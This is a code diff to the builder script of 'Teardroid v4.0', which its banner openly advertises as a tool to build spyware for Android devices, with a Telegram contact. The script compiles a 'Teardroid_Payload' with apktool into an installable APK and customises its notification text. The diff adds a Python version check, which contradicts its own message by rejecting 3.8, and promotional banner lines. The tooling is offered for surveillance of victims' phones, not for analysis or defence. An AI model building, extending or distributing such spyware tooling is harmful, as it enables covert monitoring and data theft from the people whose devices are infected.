@@ -3,7 +3,7 @@
 # Date : Wednesday, 26 January 2022
 # Time : 04:04 AM
 
-
+from platform import python_version
 from pyfiglet import Figlet
 from pydantic import BaseModel
 import argparse
@@ -12,6 +12,23 @@ import os
 from time import sleep
 from Builder import Teardroid as TeardroidBuilder
 from colorama import Fore, Style
+import emoji
+
+
+def check_python():
+    python_info = python_version().split(".")
+    if int(python_info[0]) == 3 and int(python_info[1]) > 8:
+        print("[+] Checking Python Version")
+        print("[+] Python Version : " +
+              python_info[0] + "." + python_info[1] + " \N{check mark}")
+        return True
+    else:
+        return False
+
+
+if check_python() == False:
+    print("[!] Python version is not supported. Please use Python 3.8 or higher ")
+    sys.exit(0)
 
 
 class Config(BaseModel):
@@ -47,7 +64,7 @@ def builder(name: str) -> None:
     except:
         sys.exit(0)
         print("GoodBye")
-        
+
     Teardroid = TeardroidBuilder(name)
     if os.path.isfile(name + ".apk"):
         Teardroid.print_result("Removing old APK")
@@ -57,12 +74,13 @@ def builder(name: str) -> None:
     Teardroid.changeNotification(
         NotificationText, NotificationContent, NotificationSubText)
     Teardroid.print_result("Compiling Teardroid using apktool")
-    
+
     if Teardroid.os == "posix":
         APKTOOL = os.path.join(os.getcwd(), "apktool.sh")
     else:
         APKTOOL = os.path.join(os.getcwd(), "apktool.bat")
-    os.system(APKTOOL + " b Teardroid_Payload -o " + name + "_uncompressed.apk")
+    os.system(APKTOOL + " b Teardroid_Payload -o " +
+              name + "_uncompressed.apk")
     Teardroid.print_result("Compiling Teardroid completed")
     Teardroid.print_result("Compressing APK Files using zipalign")
     Teardroid.CompressAPK()
@@ -76,6 +94,10 @@ def builder(name: str) -> None:
 
 if __name__ == '__main__':
     print(Fore.GREEN + banner())
+    print(Fore.RED +
+          "Teardroid v4.0 - A tool to build teardroid spyware for Android devices. \N{spider}")
+    print(Fore.BLUE +
+          "Contact us : https://t.me/script1337 \N{rocket}" + Fore.GREEN)
     if len(sys.argv) == 1:
         parser.print_help(sys.stderr)
         sys.exit(1)
